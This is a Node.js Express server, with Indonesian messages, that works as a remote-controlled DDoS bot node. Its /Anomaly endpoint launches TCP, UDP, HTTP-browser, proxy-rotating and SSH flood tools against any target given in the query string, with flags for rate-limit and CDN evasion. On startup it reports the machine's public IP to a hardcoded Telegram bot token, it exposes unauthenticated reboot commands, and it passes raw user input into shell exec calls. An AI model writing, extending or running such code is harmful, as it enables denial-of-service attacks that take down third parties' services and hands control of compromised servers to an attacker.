const express = require('express');
const { exec } = require('child_process');
const axios = require('axios');
const app = express();
const port = process.env.PORT || 5032;
const botToken = '8574060561:AAEfzEATpJRZAIawCQ6XgUdp20sUP2uTRVk';
const ownerId = '1656510582';
function sendToBot(message) {
  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
  axios.post(url, {
    chat_id: ownerId,
    text: message,
    parse_mode: 'Markdown'
  }).catch(() => {});
}
async function fetchData() {
  try {
    const res = await fetch('https://httpbin.org/get');
    const data = await res.json();
    console.log(`\n[ ] Endpoint Aktif: http://${data.origin}:${port}/Anomaly\n`);
    sendToBot(`  *Endpoint Aktif*\nhttp://${data.origin}:${port}/Anomaly`);
  } catch {
    console.log(`[!] Gagal ambil IP publik. Tetap jalan di port ${port}`);
  }
}

app.get('/Anomaly', (req, res) => {
  const { target, time, methods, command } = req.query;

  if (command) {
    if (command === 'reboot') {
      exec('reboot', (error) => {
        if (error) {
          return res.status(500).json({ error: 'Failed to reboot' });
        }
        return res.json({ status: 'Reboot command sent' });
      });

    } else if (command === 'pm2_restart') {
      exec('pm2 restart all', (error) => {
        if (error) {
          return res.status(500).json({ error: 'Failed to restart PM2' });
        }
        return res.json({ status: 'PM2 restarted' });
      });
    } else {
      return res.status(400).json({ error: 'Unsupported command' });
    }
    return;
  }
  if (!target || !time) {
    return res.status(400).json({ error: 'command tidak sesuai dengan method' });
  }
  const isIpPort = /^\d{1,3}(\.\d{1,3}){3}:\d+$/.test(target);
  if (isIpPort) {
    const [ip, port] = target.split(':');
    if (!methods || methods === 'tcp') {
      exec(`./tcphex ${ip} ${port} ${time} 8`);
      return res.json({ status: 'running TCP (L4)', ip, port, time });
    }
    if (methods === 'udp') {
      exec(`./udphex ${ip} ${port} ${time} 8`);
      return res.json({ status: 'running UDP (L4)', ip, port, time });
    }
    
    return res.status(400).json({ error: 'Unsupported L4 method' });
  }
  
  ///\\\\
  
  if (!methods || methods === 'browser') {
    exec(`python3 browsern.py ${target} ${time} 4 2 --optimize True`);
    return res.json({ status: 'running browser.py (L7)', target, time });
  }

  if (!methods || methods === 'pid') {
    exec(`node pid.js GET ${target} ${time} 2 32 proxy.txt --query 1 --bfm true --ua "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3" --ratelimit true --randpath true --randrate true --debug true --cdn true --full --legit`);
    return res.json({ status: 'running pid.js (L7)', target, time });
  }
  
  if (!methods || methods === 'vhold') {
    exec(`node vhold.js ${target} ${time} 32 2 proxy.txt`);
    return res.json({ status: 'running vhold.js (L7)', target, time });
  }
 
  if (methods === 'sshflood') {
    const parts = target.split(':');
    if (parts.length !== 3) {
      return res.status(400).json({ error: 'Format target sshflood salah. Gunakan ip:port:user' });
    }
    const [ip, port, user] = parts;
    exec(`node sshflood.js ${ip} ${port} ${user} ${time}`);
    return res.json({ status: 'running sshflood.js', ip, port, user, time });
  }
  res.status(400).json({ error: 'Method tidak didukung atau target tidak valid' });
});

app.listen(port, '0.0.0.0', () => {
  fetchData();
});